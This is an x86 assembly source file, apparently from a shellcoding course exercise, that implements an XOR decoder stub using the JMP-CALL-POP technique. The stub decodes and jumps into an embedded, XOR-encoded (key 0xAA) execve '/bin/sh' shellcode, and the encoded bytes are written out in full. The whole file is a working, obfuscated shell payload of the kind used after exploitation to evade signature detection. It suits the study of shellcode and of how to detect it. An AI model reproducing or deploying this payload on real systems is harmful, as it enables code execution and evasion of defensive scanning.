; Executable name : xor_02_decoder_loop2
; Version         : 1.0
; Created date    : 07/03/2020
; Last update     : 07/03/2020
; Author          : bigb0ss
; Description     : 1) This is to run XOR decode "/bin/sh" shellcode
;                   2) This will leverage a technique called JMP-CALL-POP to read decoded "/bin/sh" from the stack.
;                   3) This will also leverage maker so that we do NOT need to hardcode the length of "shellcode" for iteration
;

global _start

section .text

_start:

        jmp short call_decoder        ; JMP to "call_decoder" 

decoder:

        pop esi                       ; POPing "shellcode" on the ESI register 
      
decode_loop:

        xor byte [esi], 0xAA          ; XORing wiht Key (= 0xAA)
        jz shellcode                  ; If zero, JMP to "shellcode"
        inc esi                       ; Increase ESI by one
        loop decode_loop              ; Looping "decode_loop" for 25 time
        
call_decoder:

      call decoder                    ; CALL "decoder"
      
      ; Make sure to add the same value of the Key (=0xAA) at the end of the "shellcode" for null terminator purposes
      shellcode: db 0x9b, 0x6a, 0xfa, 0xc2, 0x85, 0x85, 0xd9, 0xc2, 0xc2, 0x85, 0xc8, 0xc3, 0xc4, 0x23, 0x49, 0xfa, 0x23, 0x48, 0xf9, 0x23, 0x4b, 0x1a, 0xa1, 0x67, 0x2a, 0xaa
      
